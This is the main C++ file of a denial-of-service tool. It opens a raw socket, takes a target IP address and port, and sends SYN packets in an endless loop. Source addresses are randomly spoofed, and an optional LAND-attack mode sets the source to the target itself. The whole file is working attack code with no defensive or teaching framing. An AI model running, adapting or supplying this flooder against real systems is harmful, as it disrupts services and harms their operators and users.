#include <iostream>
#include <regex>
#include <unistd.h>

#include"func/syn_flood.hpp"
#include"check/network.hpp"

using namespace std;

// Flag for LAND attack, Default = false
bool flagLand = false;
int opt;

int main(int argc, char* argv[])
{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    char dest_addr[30], src_addr[30];
    // Destination port Default = 80, source port
    int dport = 80, sport, temp_port;

    random_device r;

    while ((opt = getopt(argc, argv, "lp:")) != -1){
        switch (opt)
        {
            case 'l':
                flagLand = true;
                break;
            case 'p':
                temp_port = is_valid_port(optarg);

                if (is_valid_port(optarg) != -1)
                    dport = temp_port;
                else {
                    cerr << "Port number is wrong!" << endl;
                    exit(EXIT_FAILURE);
                }
                break;
            default:
                cout << opt << endl;
                break;
        }
    }

    // IP number processing
    if (optind < argc) {
        while (optind < argc){
            string arg_str(argv[optind++]);
            if (is_valid_IPv4(arg_str))
                strcpy(dest_addr, arg_str.c_str());
            else{
                cerr << "Wrong IP address form" << endl;
                exit(EXIT_FAILURE);
            }
        }
    }

    if (flagLand)
        strcpy(src_addr, dest_addr);

    while (1){
        if (!flagLand){
            std::sprintf(src_addr, "%u.%u.%u.%u",
            (unsigned int)r() % 255,
            (unsigned int)r() % 255,
            (unsigned int)r() % 255,
            (unsigned int)r() % 255);
        }
            
        syn_flood(sock, dest_addr, src_addr, dport, r());
    }

    return 0;
}